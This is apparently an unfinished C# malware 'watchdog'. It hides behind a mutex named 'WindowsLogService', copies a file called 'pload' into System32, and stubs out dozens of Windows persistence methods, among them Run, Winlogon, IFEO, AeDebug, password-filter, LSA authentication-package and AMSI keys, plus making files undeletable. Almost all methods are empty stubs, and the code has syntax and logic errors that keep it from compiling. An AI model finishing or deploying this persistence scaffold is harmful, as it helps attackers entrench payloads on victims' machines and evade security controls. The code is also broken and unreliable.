using System;
using System.Diagnostics;
using System.Linq;
using System.Threading;
using Microsoft.Win32;


class Watchdog : IWatchdog
{


    static string binaryPath = @"C:\\Windows\System32";
    static string binaryName = @"pload";



    static void Main(string[] args)
    {
        string mutexName = "WindowsLogService";

        // Create or open the mutex to ensure only one instance is running
        using (Mutex mutex = new Mutex(false, mutexName, out bool isNewInstance))
        {
            if (!isNewInstance)
            {
                    //Watchdog process is already running. Exiting.
                return;
            }

            string targetProcessName = "OtherProcessName";  // Do not include '.exe'
            if (IsProcessRunning(targetProcessName))
            {
                Console.WriteLine($"{targetProcessName} is already running. Proceeding with watchdog tasks.");
                
                // Place your watchdog logic here
                WatchdogLogic();
            }
            else
            {
                Console.WriteLine($"{targetProcessName} is not running. Exiting.");
            }
        }




    }

    static bool IWatchdog.IsProcessRunning(string processName)
    {
        // Get a list of processes by name
        Process[] processes = Process.GetProcessesByName(processName);
        return processes.Length > 0;
    }
    static void WatchdogLogic()
    {
        // Example loop to simulate frequent checks
        while (true)
        {
            






            Console.WriteLine("Watchdog is monitoring...");
            Thread.Sleep(10000);  // Sleep for 1 second
        }
    }

    public static void CheckPayload(string destinationPath)
    {
        string currentDirectory = Directory.GetCurrentDirectory();
        string sourcePath = Path.Combine(currentDirectory, binaryName);
        string destPathBinary = binaryPath.Combine(destinationPath,binaryName)


        if(File.Exists(destPathBinary) && File.Exists(sourcePath) && CompareFileHashes(destinationPath)){
            return;
        } 
        else if(File.Exists(sourcePath)){
            CopyPayload(string destPathBinary, string sourcePath);
        }
        else{

        }
    }

    public static void CopyPayload(string destPathBinary, string sourcePath){
        // Check if the .exe exists in the current directory
        if (File.Exists(sourcePath))
        {
            // Copy the .exe to the destination
            try
            {
                File.Copy(sourcePath, destinationPath, overwrite: true);
                Console.WriteLine($"'{binaryName}' found and copied to {destinationPath}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error copying file: {ex.Message}");
            }
        }
        else
        {
            Console.WriteLine($"'{binaryName}' not found in the current directory.");
        }
    }

    public static bool CompareFileHashes(string filePath1, string filePath2)
    {
        try
        {
            // Calculate the hash of each file
            byte[] hash1 = ComputeFileHash(filePath1);
            byte[] hash2 = ComputeFileHash(filePath2);

            // Compare the two hashes
            return StructuralComparisons.StructuralEqualityComparer.Equals(hash1, hash2);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error comparing files: {ex.Message}");
            return false;
        }
    }

    private static byte[] ComputeFileHash(string filePath)
    {
        using (FileStream stream = File.OpenRead(filePath))
        using (SHA256 sha256 = SHA256.Create())
        {
            return sha256.ComputeHash(stream);
        }
    }

    public static void runPayload(){

    }

    public void createPayloadBinary()
    {
        throw new NotImplementedException();
    }

    public static void spawnSecondaryWatchdog()
    {
        throw new NotImplementedException();
    }

    public static void checkSecondaryWatchdogAndRun()
    {
        throw new NotImplementedException();
    }

    public static void verifyRunKey()
    {
        throw new NotImplementedException();
    }

    public static void makeUndeletable()
    {
        throw new NotImplementedException();
    }

    public static void verifyUndeletable()
    {
        throw new NotImplementedException();
    }

    public static void setSilentProcessExit()
    {
        throw new NotImplementedException();
    }

    public static void verifySilentProcessExit()
    {
        throw new NotImplementedException();
    }

    public static void setScheduledTasks()
    {
        throw new NotImplementedException();
    }

    public static void VerifyScheduledTasks()
    {
        throw new NotImplementedException();
    }

    public static void SetKeyboardShortcuts()
    {
        throw new NotImplementedException();
    }

    public static void VerifyKeyboardShortcuts()
    {
        throw new NotImplementedException();
    }

    public static void verifyWinLogonKey()
    {
        throw new NotImplementedException();
    }

    public static void setWinLogonKey()
    {
        throw new NotImplementedException();
    }

    public static void verifyImageFileExecution()
    {
        throw new NotImplementedException();
    }

    public static void makeImageFileExecution()
    {
        throw new NotImplementedException();
    }

    public static void verifyWindowsLoadKey()
    {
        throw new NotImplementedException();
    }

    public static void makeWindowsLoadKey()
    {
        throw new NotImplementedException();
    }

    public static void verifyServicesKey()
    {
        throw new NotImplementedException();
    }

    public static void makeServicesKey()
    {
        throw new NotImplementedException();
    }

    public static void verifyAeDebugKey()
    {
        throw new NotImplementedException();
    }

    public static void makeAeDebugKey()
    {
        throw new NotImplementedException();
    }

    public static void verifyWerDebuggerKey()
    {
        throw new NotImplementedException();
    }

    public static void makeWerDebuggerKey()
    {
        throw new NotImplementedException();
    }

    public static void verifyNaturalLanguageKey()
    {
        throw new NotImplementedException();
    }

    public static void makeNaturalLanguageKey()
    {
        throw new NotImplementedException();
    }

    public static void verifyDiskCleanupHandler()
    {
        throw new NotImplementedException();
    }

    public static void makeDiskCleanupHandler()
    {
        throw new NotImplementedException();
    }

    public static void verifyHtmlHelpAuthorKey()
    {
        throw new NotImplementedException();
    }

    public static void makeHtmlHelpAuthorKey()
    {
        throw new NotImplementedException();
    }

    public static void verifyHhctrlKey()
    {
        throw new NotImplementedException();
    }

    public static void makeHhctrlKey()
    {
        throw new NotImplementedException();
    }

    public static void verifyAmsiKey()
    {
        throw new NotImplementedException();
    }

    public static void makeAmsiKey()
    {
        throw new NotImplementedException();
    }

    public static void verifyServerLevelPluginDll()
    {
        throw new NotImplementedException();
    }

    public static void makeServerLevelPluginDll()
    {
        throw new NotImplementedException();
    }

    public static void verifyPasswordFilter()
    {
        throw new NotImplementedException();
    }

    public static void makePasswordFilter()
    {
        throw new NotImplementedException();
    }

    public static void verifyCredManDll()
    {
        throw new NotImplementedException();
    }

    public static void makeCredManDll()
    {
        throw new NotImplementedException();
    }

    public static void verifyAuthenticationPackages()
    {
        throw new NotImplementedException();
    }

    public static void makeAuthenticationPackages()
    {
        throw new NotImplementedException();
    }

    public static void verifyCodeSigning()
    {
        throw new NotImplementedException();
    }

    public static void makeCodeSigning()
    {
        throw new NotImplementedException();
    }

    public static void verifyCmdAutoRun()
    {
        throw new NotImplementedException();
    }

    public static void makeCmdAutoRun()
    {
        throw new NotImplementedException();
    }

    public static void verifyLsaAExtension()
    {
        throw new NotImplementedException();
    }

    public static void makeLsaAExtension()
    {
        throw new NotImplementedException();
    }

    public static void verifyMpNotify()
    {
        throw new NotImplementedException();
    }

    public static void makeMpNotify()
    {
        throw new NotImplementedException();
    }

    public static void verifyExplorerTools()
    {
        throw new NotImplementedException();
    }

    public static void makeExplorerTools()
    {
        throw new NotImplementedException();
    }

    public static void verifyWindowsTerminalProfile()
    {
        throw new NotImplementedException();
    }

    public static void makeWindowsTerminalProfile()
    {
        throw new NotImplementedException();
    }

    public static void verifyStartupFolder()
    {
        throw new NotImplementedException();
    }

    public static void makeStartupFolder()
    {
        throw new NotImplementedException();
    }

    public static void verifyAutoDialDll()
    {
        throw new NotImplementedException();
    }

    public static void makeAutoDialDll()
    {
        throw new NotImplementedException();
    }

    public static void verifyTsInitialProgram()
    {
        throw new NotImplementedException();
    }

    public static void makeTsInitialProgram()
    {
        throw new NotImplementedException();
    }

    public static void verifyIFilter()
    {
        throw new NotImplementedException();
    }

    public static void makeIFilter()
    {
        throw new NotImplementedException();
    }

     static void verifyRecycleBin()
    {
        throw new NotImplementedException();
    }

    public static void makeRecycleBin()
    {
        throw new NotImplementedException();
    }

    public static void verifyTelemetryController()
    {
        throw new NotImplementedException();
    }

    public static void makeTelemetryController()
    {
        throw new NotImplementedException();
    }

    public static void verifySilentExitMonitor()
    {
        throw new NotImplementedException();
    }

    public static void makeSilentExitMonitor()
    {
        throw new NotImplementedException();
    }

    public static void verifyScreenSaver()
    {
        throw new NotImplementedException();
    }

    public static void makeScreenSaver()
    {
        throw new NotImplementedException();
    }

    public static void verifyBootVerificationProgram()
    {
        throw new NotImplementedException();
    }

    public static void makeBootVerificationProgram()
    {
        throw new NotImplementedException();
    }

    public static void verifyFileExtensionHijacking()
    {
        throw new NotImplementedException();
    }

    public static void makeFileExtensionHijacking()
    {
        throw new NotImplementedException();
    }

    public static void verifyKeyboardShortcut()
    {
        throw new NotImplementedException();
    }

    public static void makeKeyboardShortcut()
    {
        throw new NotImplementedException();
    }

    public static void verifyPowerShellProfile()
    {
        throw new NotImplementedException();
    }

    public static void makePowerShellProfile()
    {
        throw new NotImplementedException();
    }

    public static void verifyUserInitMprLogonScript()
    {
        throw new NotImplementedException();
    }

    public static void makeUserInitMprLogonScript()
    {
        throw new NotImplementedException();
    }

    static void IWatchdog.verifyRecycleBin()
    {
        throw new NotImplementedException();
    }
}

